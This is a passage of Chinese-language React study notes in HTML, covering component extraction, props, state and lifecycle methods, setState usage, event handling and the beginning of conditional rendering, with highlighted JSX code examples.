class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;Comment&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;UserInfo&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;Avatar&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">src</span>=<span class="hljs-string">&#123;props.author.avatarUrl&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">alt</span>=<span class="hljs-string">&#123;props.author.name&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;UserInfo-name&quot;</span>&gt;</span></span><br><span class="language-xml">          &#123;props.author.name&#125;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;Comment-text&quot;</span>&gt;</span></span><br><span class="language-xml">        &#123;props.text&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;Comment-date&quot;</span>&gt;</span></span><br><span class="language-xml">        &#123;formatDate(props.date)&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>提取<code>Avatar</code> 组件：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Avatar</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;Avatar&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">src</span>=<span class="hljs-string">&#123;props.user.avatarUrl&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">alt</span>=<span class="hljs-string">&#123;props.user.name&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">    /&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>建议从组件自身的角度命名<code>props</code>，而不是依赖于调用组件的上下文命名。</p><p>继续提取<code>UserInfo</code>组件，该组件在用户名旁渲染<code>Avatar</code>组件：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserInfo</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;UserInfo&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Avatar</span> <span class="hljs-attr">user</span>=<span class="hljs-string">&#123;props.user&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;UserInfo-name&quot;</span>&gt;</span></span><br><span class="language-xml">        &#123;props.user.name&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>简化后的<code>Comment</code>组件：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Comment</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;Comment&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">UserInfo</span> <span class="hljs-attr">user</span>=<span class="hljs-string">&#123;props.author&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;Comment-text&quot;</span>&gt;</span></span><br><span class="language-xml">        &#123;props.text&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;Comment-date&quot;</span>&gt;</span></span><br><span class="language-xml">        &#123;formatDate(props.date)&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>在大型应用中，构建可复用组件库是完全值得的。根据经验来看，如果 UI 中有一部分被多次使用（<code>Button</code>，<code>Panel</code>，<code>Avatar</code>），或者组件本身就足够复杂（<code>App</code>，<code>FeedStory</code>，<code>Comment</code>），那么它就是一个可提取出独立组件的候选项。</p><p><strong>props的只读性</strong>：所有 React 组件都必须像纯函数一样保护它们的 props 不被更改， “state”在不违反上述规则的情况下，state 允许 React 组件随用户操作、网络响应或者其他变化而动态更改输出内容。</p><h3 id="20-State-amp-生命周期"><a href="#20-State-amp-生命周期" class="headerlink" title="20.State&amp;生命周期"></a>20.State&amp;生命周期</h3><p>向 class 组件中添加局部的 state，但没有即时更新效果：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Clock</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(props);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = &#123;<span class="hljs-attr">date</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()&#125;;<br>  &#125;<br><br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, world!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>It is &#123;this.state.date.toLocaleTimeString()&#125;.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br><br><span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">render</span>(<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Clock</span> /&gt;</span></span>,<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;root&#x27;</span>)<br>);<br></code></pre></td></tr></table></figure><p>运用生命周期方法和<code>this.setState()</code>来时刻更新组件<code>state</code>，让时钟每秒刷新：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Clock</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(props);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = &#123;<span class="hljs-attr">date</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()&#125;;<br>  &#125;<br><br>  <span class="hljs-comment">//componentDidMount() 方法会在组件已经被渲染到 DOM 中后运行</span><br>  <span class="hljs-title function_">componentDidMount</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">timerID</span> = <span class="hljs-built_in">setInterval</span>(<br>      <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">tick</span>(),<br>      <span class="hljs-number">1000</span><br>    );<br>  &#125;<br><br>  <span class="hljs-comment">//componentWillUnmount() 方法会在组件从dom中被移除时调用</span><br>  <span class="hljs-title function_">componentWillUnmount</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-built_in">clearInterval</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">timerID</span>);<br>  &#125;<br><br>  <span class="hljs-title function_">tick</span>(<span class="hljs-params"></span>) &#123;    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123;      <span class="hljs-attr">date</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()    &#125;);  &#125;<br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, world!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>It is &#123;this.state.date.toLocaleTimeString()&#125;.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br><br><span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">render</span>(<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Clock</span> /&gt;</span></span>,<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;root&#x27;</span>)<br>);<br></code></pre></td></tr></table></figure><p><strong>正确使用<code>state</code></strong></p><ol><li><p>不要直接修改<code>state</code>，而应该使用<code>setState()</code>，构造函数是唯一可以给<code>this.state</code>赋值的地方。</p></li><li><p><code>state</code>的更新可能是异步的，出于性能考虑，react可能会把多个<code>setState()</code>调用合并成一个调用，因为 <code>this.props</code> 和 <code>this.state</code> 可能会异步更新，所以你不要依赖他们的值来更新下一个状态。</p><p>例如，下例可能不会更新计时器：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">// Wrong</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123;<br>  <span class="hljs-attr">counter</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">counter</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">increment</span>,<br>&#125;);<br></code></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">// Correct</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(<span class="hljs-function">(<span class="hljs-params">state, props</span>) =&gt;</span> (&#123;<br>  <span class="hljs-attr">counter</span>: state.<span class="hljs-property">counter</span> + props.<span class="hljs-property">increment</span><br>&#125;));<br></code></pre></td></tr></table></figure></li><li><p><code>state</code>的更新会被合并，当你调用 <code>setState()</code> 的时候，React 会把你提供的对象合并到当前的 state。</p><p>例如，你的 state 包含几个独立的变量：</p></li></ol><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-title function_">constructor</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-variable language_">super</span>(props);<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = &#123;<br>    <span class="hljs-attr">posts</span>: [],      <span class="hljs-attr">comments</span>: []    &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>​然后你可以分别调用 <code>setState()</code> 来单独地更新它们：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-title function_">componentDidMount</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-title function_">fetchPosts</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123;<br>      <span class="hljs-attr">posts</span>: response.<span class="hljs-property">posts</span>      &#125;);<br>  &#125;);<br><br>  <span class="hljs-title function_">fetchComments</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123;<br>      <span class="hljs-attr">comments</span>: response.<span class="hljs-property">comments</span>      &#125;);<br>  &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>​这里的合并是浅合并，所以 <code>this.setState(&#123;comments&#125;)</code> 完整保留了 <code>this.state.posts</code>， 但是完全替换了 <code>this.state.comments</code>。</p><ol start="4"><li>数据是向下流动的</li></ol><p>不管是父组件或是子组件都无法知道某个组件是有状态的还是无状态的，并且它们也并不关心它是函数组件还是 class 组件。</p><p>这就是为什么称 state 为局部的或是封装的的原因。除了拥有并设置了它的组件，其他组件都无法访问。</p><p>如下例，<code>FormattedDate</code> 组件会在其 props 中接收参数 <code>date</code>，但是组件本身无法知道它是来自于 <code>Clock</code> 的 state，或是 <code>Clock</code> 的 props，还是手动输入的：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">FormattedDate</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>It is &#123;props.date.toLocaleTimeString()&#125;.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span>;<br>&#125;<br>&lt;<span class="hljs-title class_">FormattedDate</span> date=&#123;<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">date</span>&#125; /&gt;<br></code></pre></td></tr></table></figure><p>这通常会被叫做“自上而下”或是“单向”的数据流。任何的 state 总是所属于特定的组件，而且从该 state 派生的任何数据或 UI 只能影响树中“低于”它们的组件。</p><p>如果你把一个以组件构成的树想象成一个 props 的数据瀑布的话，那么每一个组件的 state 就像是在任意一点上给瀑布增加额外的水源，但是它只能向下流动。</p><h4 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a><strong>生命周期</strong></h4><p>每个组件都包含“生命周期方法”，你可以重写这些方法，以便于在运行过程中特定的阶段执行这些方法。</p><p><a href="https://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/">https://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/</a></p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/1151667355557_.pic-20221102%2010:22:44.jpg" alt="1151667355557_.pic">挂载</p><p>当组件实例被创建并插入 DOM 中时，其生命周期调用顺序如下：</p><ul><li><a href="https://react.docschina.org/docs/react-component.html#constructor"><strong><code>constructor()</code></strong></a></li><li><a href="https://react.docschina.org/docs/react-component.html#static-getderivedstatefromprops"><code>static getDerivedStateFromProps()</code></a></li><li><a href="https://react.docschina.org/docs/react-component.html#render"><strong><code>render()</code></strong></a></li><li><a href="https://react.docschina.org/docs/react-component.html#componentdidmount"><strong><code>componentDidMount()</code></strong></a></li></ul><p>更新</p><p>当组件的 props 或 state 发生变化时会触发更新。组件更新的生命周期调用顺序如下：</p><ul><li><a href="https://react.docschina.org/docs/react-component.html#static-getderivedstatefromprops"><code>static getDerivedStateFromProps()</code></a></li><li><a href="https://react.docschina.org/docs/react-component.html#shouldcomponentupdate"><code>shouldComponentUpdate()</code></a></li><li><a href="https://react.docschina.org/docs/react-component.html#render"><strong><code>render()</code></strong></a></li><li><a href="https://react.docschina.org/docs/react-component.html#getsnapshotbeforeupdate"><code>getSnapshotBeforeUpdate()</code></a></li><li><a href="https://react.docschina.org/docs/react-component.html#componentdidupdate"><strong><code>componentDidUpdate()</code></strong></a></li></ul><p>卸载</p><p>当组件从 DOM 中移除时会调用如下方法：</p><ul><li><a href="https://react.docschina.org/docs/react-component.html#componentwillunmount"><strong><code>componentWillUnmount()</code></strong></a></li></ul><p>错误处理</p><p>当渲染过程，生命周期，或子组件的构造函数中抛出错误时，会调用如下方法：</p><ul><li><a href="https://react.docschina.org/docs/react-component.html#static-getderivedstatefromerror"><code>static getDerivedStateFromError()</code></a></li><li><a href="https://react.docschina.org/docs/react-component.html#componentdidcatch"><code>componentDidCatch()</code></a></li></ul><p>组件还提供了一些额外的 API：</p><ul><li><a href="https://react.docschina.org/docs/react-component.html#setstate"><code>setState()</code></a></li><li><a href="https://react.docschina.org/docs/react-component.html#forceupdate"><code>forceUpdate()</code></a></li></ul><p>class 属性</p><ul><li><a href="https://react.docschina.org/docs/react-component.html#defaultprops"><code>defaultProps</code></a></li><li><a href="https://react.docschina.org/docs/react-component.html#displayname"><code>displayName</code></a></li></ul><p>实例属性</p><ul><li><a href="https://react.docschina.org/docs/react-component.html#props"><code>props</code></a></li><li><a href="https://react.docschina.org/docs/react-component.html#state"><code>state</code></a></li></ul><p><code>render()</code> 方法是 class 组件中唯一必须实现的方法。</p><p>当 <code>render</code> 被调用时，它会检查 <code>this.props</code> 和 <code>this.state</code> 的变化并返回以下类型之一：</p><ul><li><strong>React 元素</strong>。通常通过 JSX 创建。例如，<code>&lt;div /&gt;</code> 会被 React 渲染为 DOM 节点，<code>&lt;MyComponent /&gt;</code> 会被 React 渲染为自定义组件，无论是 <code>&lt;div /&gt;</code> 还是 <code>&lt;MyComponent /&gt;</code> 均为 React 元素。</li><li><strong>数组或 fragments</strong>。 使得 render 方法可以返回多个元素。欲了解更多详细信息，请参阅 <a href="https://react.docschina.org/docs/fragments.html">fragments</a> 文档。</li><li><strong>Portals</strong>。可以渲染子节点到不同的 DOM 子树中。欲了解更多详细信息，请参阅有关 <a href="https://react.docschina.org/docs/portals.html">portals</a> 的文档</li><li><strong>字符串或数值类型</strong>。它们在 DOM 中会被渲染为文本节点</li><li>**布尔类型或 <code>null</code>**。什么都不渲染。（主要用于支持返回 <code>test &amp;&amp; &lt;Child /&gt;</code> 的模式，其中 test 为布尔类型。)</li></ul><p><code>render()</code> 函数应该为纯函数，这意味着在不修改组件 state 的情况下，每次调用时都返回相同的结果，并且它不会直接与浏览器交互。</p><p>如需与浏览器进行交互，请在 <code>componentDidMount()</code> 或其他生命周期方法中执行你的操作。保持 <code>render()</code> 为纯函数，可以使组件更容易思考。</p><p>更多细节参考：<a href="https://react.docschina.org/docs/react-component.html">生命周期</a></p><h3 id="21-事件处理"><a href="#21-事件处理" class="headerlink" title="21. 事件处理"></a>21. 事件处理</h3><p>React 元素的事件处理和 DOM 元素的很相似，但是有一点语法上的不同：</p><ul><li>React 事件的命名采用小驼峰式（camelCase），而不是纯小写。</li><li>使用 JSX 语法时你需要传入一个函数作为事件处理函数，而不是一个字符串。</li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jsx">&lt;button onClick=&#123;activateLasers&#125;&gt;<br>  <span class="hljs-title class_">Activate</span> <span class="hljs-title class_">Lasers</span><br>&lt;/button&gt;<br></code></pre></td></tr></table></figure><p>另一个不同点是你不能通过返回 <code>false</code> 的方式阻止默认行为。你必须显式的使用 <code>preventDefault</code> 。例如：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ActionLink</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleClick</span>(<span class="hljs-params">e</span>) &#123;<br>    e.<span class="hljs-title function_">preventDefault</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;The link was clicked.&#x27;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handleClick&#125;</span>&gt;</span></span><br><span class="language-xml">      Click me</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>在这里，<code>e</code> 是一个合成事件。</p><p>当你使用 ES6 class语法定义一个组件的时候，通常的做法是将事件处理函数声明为 class 中的方法。例如，下面的 <code>Toggle</code> 组件会渲染一个让用户切换开关状态的按钮：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Toggle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(props);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = &#123;<span class="hljs-attr">isToggleOn</span>: <span class="hljs-literal">true</span>&#125;;<br><br>    <span class="hljs-comment">// 为了在回调中使用 `this`，这个绑定是必不可少的</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleClick</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleClick</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);<br>  &#125;<br><br>  <span class="hljs-title function_">handleClick</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> (&#123;<br>      <span class="hljs-attr">isToggleOn</span>: !state.<span class="hljs-property">isToggleOn</span><br>    &#125;));<br>  &#125;<br><br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;this.handleClick&#125;</span>&gt;</span></span><br><span class="language-xml">        &#123;this.state.isToggleOn ? &#x27;ON&#x27; : &#x27;OFF&#x27;&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br><br><span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">render</span>(<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Toggle</span> /&gt;</span></span>,<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;root&#x27;</span>)<br>);<br></code></pre></td></tr></table></figure><p>向事件处理函数传递参数：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jsx">&lt;button onClick=&#123;<span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">deleteRow</span>(id, e)&#125;&gt;<span class="hljs-title class_">Delete</span> <span class="hljs-title class_">Row</span>&lt;/button&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;this.deleteRow.bind(this,</span> <span class="hljs-attr">id</span>)&#125;&gt;</span>Delete Row<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>上述两种方式是等价的，分别通过<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions">箭头函数</a>和 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_objects/Function/bind"><code>Function.prototype.bind</code></a> 来实现。</p><p>在这两种情况下，React 的事件对象 <code>e</code> 会被作为第二个参数传递。如果通过箭头函数的方式，事件对象必须显式的进行传递，而通过 <code>bind</code> 的方式，事件对象以及更多的参数将会被隐式的进行传递。</p><h3 id="22-条件渲染"><a href="#22-条件渲染" class="headerlink" title="22. 条件渲染"></a>22. 条件渲染</h3><p>React 中的条件渲染和 JavaScript 中的一样，使用 JavaScript 运算符 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/if...else"><code>if</code></a> 或者<a href="https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Operators/Conditional_Operator">条件运算符</a>去创建元素来表现当前的状态，然后让 React 根据它们来更新 UI。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 